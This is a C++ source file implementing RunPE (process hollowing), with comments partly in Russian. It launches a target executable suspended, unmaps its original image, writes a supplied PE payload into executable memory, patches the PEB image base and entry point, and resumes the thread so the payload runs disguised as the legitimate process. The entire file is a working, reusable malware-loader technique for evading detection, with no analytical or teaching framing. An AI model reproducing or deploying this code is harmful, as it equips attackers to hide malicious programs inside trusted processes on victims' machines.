#include "runpe.h"
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>

// Типы для NtUnmapViewOfSection
typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);

bool RunPE(const std::wstring& targetPath, const std::vector<uint8_t>& image, std::wstring* error) {
    if (image.size() < sizeof(IMAGE_DOS_HEADER)) {
        if (error) *error = L"Invalid PE: too small";
        return false;
    }

    // Проверяем DOS header
    auto dosHeader = reinterpret_cast<const IMAGE_DOS_HEADER*>(image.data());
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        if (error) *error = L"Invalid PE: no DOS signature";
        return false;
    }

    if (dosHeader->e_lfanew >= (LONG)image.size() || dosHeader->e_lfanew < 0) {
        if (error) *error = L"Invalid PE: bad e_lfanew";
        return false;
    }

    if ((size_t)dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) > image.size()) {
        if (error) *error = L"Invalid PE: NT headers out of bounds";
        return false;
    }

    // Проверяем NT headers
    auto ntHeaders = reinterpret_cast<const IMAGE_NT_HEADERS*>(image.data() + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        if (error) *error = L"Invalid PE: no NT signature";
        return false;
    }

    // Validate image size and section count
    if (ntHeaders->OptionalHeader.SizeOfImage > 0x10000000) { // Max 256MB
        if (error) *error = L"Invalid PE: image too large";
        return false;
    }
    
    if (ntHeaders->FileHeader.NumberOfSections > 96) { // Reasonable limit
        if (error) *error = L"Invalid PE: too many sections";
        return false;
    }

    // Check if we have enough space for section headers
    size_t sectionsOffset = dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS);
    size_t sectionsSize = ntHeaders->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
    if (sectionsOffset + sectionsSize > image.size()) {
        if (error) *error = L"Invalid PE: section headers out of bounds";
        return false;
    }

    // Создаем процесс в suspended состоянии
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    
    if (!CreateProcessW(targetPath.c_str(), NULL, NULL, NULL, FALSE, 
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        if (error) *error = L"Failed to create suspended process";
        return false;
    }

    bool success = false;
    do {
        // Получаем контекст потока
        CONTEXT context = {};
        context.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &context)) {
            if (error) *error = L"Failed to get thread context";
            break;
        }

        // Получаем базовый адрес оригинального образа из PEB
        PVOID imageBase = nullptr;
#ifdef _WIN64
        if (!ReadProcessMemory(pi.hProcess, (PVOID)(context.Rdx + sizeof(PVOID) * 2), 
                              &imageBase, sizeof(imageBase), NULL)) {
#else
        if (!ReadProcessMemory(pi.hProcess, (PVOID)(context.Ebx + sizeof(PVOID) * 2), 
                              &imageBase, sizeof(imageBase), NULL)) {
#endif
            if (error) *error = L"Failed to read image base from PEB";
            break;
        }

        // Освобождаем память оригинального образа
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll) {
            if (error) *error = L"Failed to get ntdll handle";
            break;
        }

        auto NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(ntdll, "NtUnmapViewOfSection");
        if (!NtUnmapViewOfSection) {
            if (error) *error = L"Failed to get NtUnmapViewOfSection";
            break;
        }

        NtUnmapViewOfSection(pi.hProcess, imageBase);

        // Выделяем память для нового образа
        PVOID newImageBase = VirtualAllocEx(pi.hProcess, 
                                           (PVOID)ntHeaders->OptionalHeader.ImageBase,
                                           ntHeaders->OptionalHeader.SizeOfImage,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (!newImageBase) {
            // Пробуем выделить по любому адресу
            newImageBase = VirtualAllocEx(pi.hProcess, NULL,
                                         ntHeaders->OptionalHeader.SizeOfImage,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!newImageBase) {
                if (error) *error = L"Failed to allocate memory in target process";
                break;
            }
        }

        // Записываем заголовки (with bounds check)
        DWORD headersSize = min(ntHeaders->OptionalHeader.SizeOfHeaders, (DWORD)image.size());
        if (!WriteProcessMemory(pi.hProcess, newImageBase, image.data(),
                               headersSize, NULL)) {
            if (error) *error = L"Failed to write PE headers";
            break;
        }

        // Записываем секции
        auto sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        bool sectionsOk = true;
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (sectionHeader[i].SizeOfRawData > 0 && 
                sectionHeader[i].PointerToRawData < image.size() &&
                sectionHeader[i].PointerToRawData + sectionHeader[i].SizeOfRawData <= image.size()) {
                
                PVOID sectionDest = (PVOID)((ULONG_PTR)newImageBase + sectionHeader[i].VirtualAddress);
                const void* sectionSrc = image.data() + sectionHeader[i].PointerToRawData;
                
                // Verify section doesn't exceed allocated memory
                if (sectionHeader[i].VirtualAddress + sectionHeader[i].SizeOfRawData > 
                    ntHeaders->OptionalHeader.SizeOfImage) {
                    if (error) *error = L"Invalid PE: section exceeds image size";
                    sectionsOk = false;
                    break;
                }
                
                if (!WriteProcessMemory(pi.hProcess, sectionDest, sectionSrc,
                                       sectionHeader[i].SizeOfRawData, NULL)) {
                    if (error) *error = L"Failed to write PE section";
                    sectionsOk = false;
                    break;
                }
            }
        }
        
        if (!sectionsOk) break;

        // Обновляем базовый адрес в PEB, если он изменился
        if (newImageBase != (PVOID)ntHeaders->OptionalHeader.ImageBase) {
#ifdef _WIN64
            if (!WriteProcessMemory(pi.hProcess, (PVOID)(context.Rdx + sizeof(PVOID) * 2),
                                   &newImageBase, sizeof(newImageBase), NULL)) {
#else
            if (!WriteProcessMemory(pi.hProcess, (PVOID)(context.Ebx + sizeof(PVOID) * 2),
                                   &newImageBase, sizeof(newImageBase), NULL)) {
#endif
                if (error) *error = L"Failed to update image base in PEB";
                break;
            }
        }

        // Устанавливаем точку входа
        ULONG_PTR entryPoint = (ULONG_PTR)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#ifdef _WIN64
        context.Rcx = entryPoint;
#else
        context.Eax = entryPoint;
#endif

        if (!SetThreadContext(pi.hThread, &context)) {
            if (error) *error = L"Failed to set thread context";
            break;
        }

        success = true;
    } while (false);

cleanup:
    if (success) {
        ResumeThread(pi.hThread);
    } else {
        TerminateProcess(pi.hProcess, 1);
    }
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return success;
}